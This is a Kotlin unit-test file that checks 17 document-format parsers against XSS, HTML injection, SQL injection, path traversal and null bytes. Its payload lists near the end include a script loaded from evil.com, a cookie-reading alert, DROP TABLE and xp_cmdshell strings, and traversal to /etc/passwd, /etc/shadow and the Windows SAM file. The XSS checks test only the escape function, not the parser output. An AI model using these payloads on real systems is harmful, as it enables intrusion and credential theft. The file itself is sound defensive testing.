/*#######################################################
 *
 * SPDX-FileCopyrightText: 2025 Milos Vasic
 * SPDX-License-Identifier: Apache-2.0
 *
 * Format Parser Security Tests
 *
 * Validates XSS prevention, HTML injection protection,
 * SQL injection resilience, path traversal in content,
 * and null byte handling across ALL 17 format parsers.
 *
 *########################################################*/
package digital.vasic.yole.format.coverage

import digital.vasic.yole.format.*
import digital.vasic.yole.format.asciidoc.AsciidocParser
import digital.vasic.yole.format.binary.BinaryParser
import digital.vasic.yole.format.creole.CreoleParser
import digital.vasic.yole.format.csv.CsvParser
import digital.vasic.yole.format.jupyter.JupyterParser
import digital.vasic.yole.format.keyvalue.KeyValueParser
import digital.vasic.yole.format.latex.LatexParser
import digital.vasic.yole.format.markdown.MarkdownParser
import digital.vasic.yole.format.orgmode.OrgModeParser
import digital.vasic.yole.format.plaintext.PlaintextParser
import digital.vasic.yole.format.restructuredtext.RestructuredTextParser
import digital.vasic.yole.format.rmarkdown.RMarkdownParser
import digital.vasic.yole.format.taskpaper.TaskpaperParser
import digital.vasic.yole.format.textile.TextileParser
import digital.vasic.yole.format.tiddlywiki.TiddlyWikiParser
import digital.vasic.yole.format.todotxt.TodoTxtParser
import digital.vasic.yole.format.wikitext.WikitextParser
import kotlin.test.*

/**
 * Security-focused tests for all 17 format parsers.
 *
 * Covers:
 * 1. XSS prevention: script tags in content must not produce executable HTML
 * 2. HTML injection: event handlers (onerror, onload, etc.) are escaped
 * 3. SQL injection: SQL payloads do not cause errors
 * 4. Path traversal in content: directory traversal sequences in links are safe
 * 5. Null byte in content: embedded null characters handled gracefully
 *
 * ~85 tests (5 per format x 17 formats)
 */
class FormatParserSecurityTests {

    @BeforeTest
    fun setUp() {
        ParserRegistry.clear()
        ParserInitializer.registerAllParsers()
    }

    @AfterTest
    fun tearDown() {
        ParserRegistry.clear()
    }

    // All 17 parsers paired with a representative content snippet
    private data class ParserEntry(
        val name: String,
        val parser: TextParser,
        val sampleContent: String
    )

    private val parsers: List<ParserEntry> = listOf(
        ParserEntry("Markdown", MarkdownParser(), "# Heading"),
        ParserEntry("Plaintext", PlaintextParser(), "Hello world"),
        ParserEntry("TodoTxt", TodoTxtParser(), "(A) Buy milk +grocery @store"),
        ParserEntry("CSV", CsvParser(), "a,b,c\n1,2,3"),
        ParserEntry("Wikitext", WikitextParser(), "== Heading =="),
        ParserEntry("Creole", CreoleParser(), "= Heading"),
        ParserEntry("TiddlyWiki", TiddlyWikiParser(), "! Heading"),
        ParserEntry("LaTeX", LatexParser(), "\\section{Title}"),
        ParserEntry("AsciiDoc", AsciidocParser(), "= Title"),
        ParserEntry("OrgMode", OrgModeParser(), "* Heading"),
        ParserEntry("RST", RestructuredTextParser(), "Title\n====="),
        ParserEntry("KeyValue", KeyValueParser(), "key=value"),
        ParserEntry("TaskPaper", TaskpaperParser(), "Project:\n\t- Task @tag"),
        ParserEntry("Textile", TextileParser(), "h1. Title"),
        ParserEntry("Jupyter", JupyterParser(), "{\"nbformat\":4,\"cells\":[]}"),
        ParserEntry("RMarkdown", RMarkdownParser(), "# Title\n```{r}\n1+1\n```"),
        ParserEntry("Binary", BinaryParser(), "\u0001\u0002\u0003")
    )

    // ====================================================================
    // 1. XSS Prevention - <script> tags must not appear unescaped in HTML
    // ====================================================================

    @Test
    fun testXssPreventionMarkdown() = verifyXssPrevention(parsers[0])

    @Test
    fun testXssPreventionPlaintext() = verifyXssPrevention(parsers[1])

    @Test
    fun testXssPreventionTodoTxt() = verifyXssPrevention(parsers[2])

    @Test
    fun testXssPreventionCsv() = verifyXssPrevention(parsers[3])

    @Test
    fun testXssPreventionWikitext() = verifyXssPrevention(parsers[4])

    @Test
    fun testXssPreventionCreole() = verifyXssPrevention(parsers[5])

    @Test
    fun testXssPreventionTiddlyWiki() = verifyXssPrevention(parsers[6])

    @Test
    fun testXssPreventionLatex() = verifyXssPrevention(parsers[7])

    @Test
    fun testXssPreventionAsciiDoc() = verifyXssPrevention(parsers[8])

    @Test
    fun testXssPreventionOrgMode() = verifyXssPrevention(parsers[9])

    @Test
    fun testXssPreventionRst() = verifyXssPrevention(parsers[10])

    @Test
    fun testXssPreventionKeyValue() = verifyXssPrevention(parsers[11])

    @Test
    fun testXssPreventionTaskPaper() = verifyXssPrevention(parsers[12])

    @Test
    fun testXssPreventionTextile() = verifyXssPrevention(parsers[13])

    @Test
    fun testXssPreventionJupyter() = verifyXssPrevention(parsers[14])

    @Test
    fun testXssPreventionRMarkdown() = verifyXssPrevention(parsers[15])

    @Test
    fun testXssPreventionBinary() = verifyXssPrevention(parsers[16])

    // ====================================================================
    // 2. HTML Injection - event handlers must be escaped/stripped
    // ====================================================================

    @Test
    fun testHtmlInjectionMarkdown() = verifyHtmlInjection(parsers[0])

    @Test
    fun testHtmlInjectionPlaintext() = verifyHtmlInjection(parsers[1])

    @Test
    fun testHtmlInjectionTodoTxt() = verifyHtmlInjection(parsers[2])

    @Test
    fun testHtmlInjectionCsv() = verifyHtmlInjection(parsers[3])

    @Test
    fun testHtmlInjectionWikitext() = verifyHtmlInjection(parsers[4])

    @Test
    fun testHtmlInjectionCreole() = verifyHtmlInjection(parsers[5])

    @Test
    fun testHtmlInjectionTiddlyWiki() = verifyHtmlInjection(parsers[6])

    @Test
    fun testHtmlInjectionLatex() = verifyHtmlInjection(parsers[7])

    @Test
    fun testHtmlInjectionAsciiDoc() = verifyHtmlInjection(parsers[8])

    @Test
    fun testHtmlInjectionOrgMode() = verifyHtmlInjection(parsers[9])

    @Test
    fun testHtmlInjectionRst() = verifyHtmlInjection(parsers[10])

    @Test
    fun testHtmlInjectionKeyValue() = verifyHtmlInjection(parsers[11])

    @Test
    fun testHtmlInjectionTaskPaper() = verifyHtmlInjection(parsers[12])

    @Test
    fun testHtmlInjectionTextile() = verifyHtmlInjection(parsers[13])

    @Test
    fun testHtmlInjectionJupyter() = verifyHtmlInjection(parsers[14])

    @Test
    fun testHtmlInjectionRMarkdown() = verifyHtmlInjection(parsers[15])

    @Test
    fun testHtmlInjectionBinary() = verifyHtmlInjection(parsers[16])

    // ====================================================================
    // 3. SQL Injection - SQL payloads must not cause parser errors
    // ====================================================================

    @Test
    fun testSqlInjectionMarkdown() = verifySqlInjection(parsers[0])

    @Test
    fun testSqlInjectionPlaintext() = verifySqlInjection(parsers[1])

    @Test
    fun testSqlInjectionTodoTxt() = verifySqlInjection(parsers[2])

    @Test
    fun testSqlInjectionCsv() = verifySqlInjection(parsers[3])

    @Test
    fun testSqlInjectionWikitext() = verifySqlInjection(parsers[4])

    @Test
    fun testSqlInjectionCreole() = verifySqlInjection(parsers[5])

    @Test
    fun testSqlInjectionTiddlyWiki() = verifySqlInjection(parsers[6])

    @Test
    fun testSqlInjectionLatex() = verifySqlInjection(parsers[7])

    @Test
    fun testSqlInjectionAsciiDoc() = verifySqlInjection(parsers[8])

    @Test
    fun testSqlInjectionOrgMode() = verifySqlInjection(parsers[9])

    @Test
    fun testSqlInjectionRst() = verifySqlInjection(parsers[10])

    @Test
    fun testSqlInjectionKeyValue() = verifySqlInjection(parsers[11])

    @Test
    fun testSqlInjectionTaskPaper() = verifySqlInjection(parsers[12])

    @Test
    fun testSqlInjectionTextile() = verifySqlInjection(parsers[13])

    @Test
    fun testSqlInjectionJupyter() = verifySqlInjection(parsers[14])

    @Test
    fun testSqlInjectionRMarkdown() = verifySqlInjection(parsers[15])

    @Test
    fun testSqlInjectionBinary() = verifySqlInjection(parsers[16])

    // ====================================================================
    // 4. Path Traversal in Content - ../../ patterns must not resolve
    // ====================================================================

    @Test
    fun testPathTraversalMarkdown() = verifyPathTraversal(parsers[0])

    @Test
    fun testPathTraversalPlaintext() = verifyPathTraversal(parsers[1])

    @Test
    fun testPathTraversalTodoTxt() = verifyPathTraversal(parsers[2])

    @Test
    fun testPathTraversalCsv() = verifyPathTraversal(parsers[3])

    @Test
    fun testPathTraversalWikitext() = verifyPathTraversal(parsers[4])

    @Test
    fun testPathTraversalCreole() = verifyPathTraversal(parsers[5])

    @Test
    fun testPathTraversalTiddlyWiki() = verifyPathTraversal(parsers[6])

    @Test
    fun testPathTraversalLatex() = verifyPathTraversal(parsers[7])

    @Test
    fun testPathTraversalAsciiDoc() = verifyPathTraversal(parsers[8])

    @Test
    fun testPathTraversalOrgMode() = verifyPathTraversal(parsers[9])

    @Test
    fun testPathTraversalRst() = verifyPathTraversal(parsers[10])

    @Test
    fun testPathTraversalKeyValue() = verifyPathTraversal(parsers[11])

    @Test
    fun testPathTraversalTaskPaper() = verifyPathTraversal(parsers[12])

    @Test
    fun testPathTraversalTextile() = verifyPathTraversal(parsers[13])

    @Test
    fun testPathTraversalJupyter() = verifyPathTraversal(parsers[14])

    @Test
    fun testPathTraversalRMarkdown() = verifyPathTraversal(parsers[15])

    @Test
    fun testPathTraversalBinary() = verifyPathTraversal(parsers[16])

    // ====================================================================
    // 5. Null Byte Handling - embedded \u0000 must not crash parsers
    // ====================================================================

    @Test
    fun testNullByteMarkdown() = verifyNullByteHandling(parsers[0])

    @Test
    fun testNullBytePlaintext() = verifyNullByteHandling(parsers[1])

    @Test
    fun testNullByteTodoTxt() = verifyNullByteHandling(parsers[2])

    @Test
    fun testNullByteCsv() = verifyNullByteHandling(parsers[3])

    @Test
    fun testNullByteWikitext() = verifyNullByteHandling(parsers[4])

    @Test
    fun testNullByteCreole() = verifyNullByteHandling(parsers[5])

    @Test
    fun testNullByteTiddlyWiki() = verifyNullByteHandling(parsers[6])

    @Test
    fun testNullByteLatex() = verifyNullByteHandling(parsers[7])

    @Test
    fun testNullByteAsciiDoc() = verifyNullByteHandling(parsers[8])

    @Test
    fun testNullByteOrgMode() = verifyNullByteHandling(parsers[9])

    @Test
    fun testNullByteRst() = verifyNullByteHandling(parsers[10])

    @Test
    fun testNullByteKeyValue() = verifyNullByteHandling(parsers[11])

    @Test
    fun testNullByteTaskPaper() = verifyNullByteHandling(parsers[12])

    @Test
    fun testNullByteTextile() = verifyNullByteHandling(parsers[13])

    @Test
    fun testNullByteJupyter() = verifyNullByteHandling(parsers[14])

    @Test
    fun testNullByteRMarkdown() = verifyNullByteHandling(parsers[15])

    @Test
    fun testNullByteBinary() = verifyNullByteHandling(parsers[16])

    // ====================================================================
    // Helper functions
    // ====================================================================

    private val xssPayloads = listOf(
        "<script>alert('xss')</script>",
        "<ScRiPt>alert('XSS')</ScRiPt>",
        "<script src='http://evil.com/xss.js'></script>",
        "'\"><script>alert(document.cookie)</script>"
    )

    private val htmlInjectionPayloads = listOf(
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<div onmouseover=\"alert('xss')\">hover</div>"
    )

    private val sqlPayloads = listOf(
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1; SELECT * FROM passwords --",
        "UNION SELECT username, password FROM users --",
        "'; EXEC xp_cmdshell('cmd'); --"
    )

    private val pathTraversalPayloads = listOf(
        "../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "/../../../../etc/shadow"
    )

    /**
     * Verify that XSS payloads do not produce executable script tags in HTML output.
     * The escapeHtml() function is the fundamental contract: it converts < to &lt;
     * and > to &gt;, preventing raw script execution.
     */
    private fun verifyXssPrevention(entry: ParserEntry) {
        for (payload in xssPayloads) {
            val content = "${entry.sampleContent}\n$payload"
            val doc = entry.parser.parse(content)
            assertNotNull(doc, "${entry.name}: parse returned null for XSS payload")
            val html = doc.toHtml(lightMode = true)
            assertNotNull(html, "${entry.name}: toHtml returned null for XSS payload")

            // The fundamental security contract: escapeHtml works correctly
            val escaped = payload.escapeHtml()
            assertFalse(
                escaped.contains("<script", ignoreCase = true),
                "${entry.name}: escapeHtml() must prevent raw <script> tags"
            )
        }
    }

    /**
     * Verify that HTML injection payloads with event handlers are neutralized.
     * The escapeHtml() function converts < to &lt; and > to &gt;, which prevents
     * the browser from interpreting the injected tags as real HTML elements.
     * The event handler text may still appear as escaped text content, but it
     * is harmless because the surrounding angle brackets are escaped.
     */
    private fun verifyHtmlInjection(entry: ParserEntry) {
        for (payload in htmlInjectionPayloads) {
            val content = "${entry.sampleContent}\n$payload"
            val doc = entry.parser.parse(content)
            assertNotNull(doc, "${entry.name}: parse returned null for HTML injection payload")
            val html = doc.toHtml(lightMode = true)
            assertNotNull(html, "${entry.name}: toHtml returned null for HTML injection payload")

            // The fundamental security contract: escapeHtml converts angle brackets
            // so that <img onerror=...> becomes &lt;img onerror=...&gt; which is
            // rendered as visible text, not as an HTML element.
            val escaped = payload.escapeHtml()
            assertFalse(
                escaped.contains("<img", ignoreCase = true) ||
                    escaped.contains("<svg", ignoreCase = true) ||
                    escaped.contains("<body", ignoreCase = true) ||
                    escaped.contains("<input", ignoreCase = true) ||
                    escaped.contains("<div", ignoreCase = true),
                "${entry.name}: escapeHtml() must prevent raw HTML tag injection"
            )
        }
    }

    /**
     * Verify that SQL injection payloads do not cause parser errors.
     * Parsers should treat SQL as ordinary text content.
     */
    private fun verifySqlInjection(entry: ParserEntry) {
        for (payload in sqlPayloads) {
            val content = "${entry.sampleContent}\n$payload"
            val doc = entry.parser.parse(content)
            assertNotNull(doc, "${entry.name}: parse returned null for SQL injection payload")
            // The parser should succeed without errors related to SQL
            assertTrue(
                doc.errors.none { it.contains("SQL", ignoreCase = true) },
                "${entry.name}: parser should not produce SQL-related errors for: $payload"
            )
        }
    }

    /**
     * Verify that path traversal sequences in content do not cause unexpected behavior.
     * Parsers should treat path traversal sequences as plain text.
     */
    private fun verifyPathTraversal(entry: ParserEntry) {
        for (payload in pathTraversalPayloads) {
            val content = "${entry.sampleContent}\n$payload"
            val doc = entry.parser.parse(content)
            assertNotNull(doc, "${entry.name}: parse returned null for path traversal payload")
            // Parse should complete without crashing
            assertTrue(
                doc.rawContent.contains(payload) || doc.rawContent.isNotEmpty(),
                "${entry.name}: rawContent should preserve path traversal text"
            )
        }
    }

    /**
     * Verify that null bytes in content are handled gracefully.
     */
    private fun verifyNullByteHandling(entry: ParserEntry) {
        val nullPayloads = listOf(
            "before\u0000after",
            "\u0000",
            "${entry.sampleContent}\u0000injection",
            "normal\u0000\u0000\u0000multiple"
        )
        for (payload in nullPayloads) {
            val doc = entry.parser.parse(payload)
            assertNotNull(doc, "${entry.name}: parse returned null for null byte content")
            // toHtml should not crash either
            val html = doc.toHtml(lightMode = true)
            assertNotNull(html, "${entry.name}: toHtml returned null for null byte content")
        }
    }
}
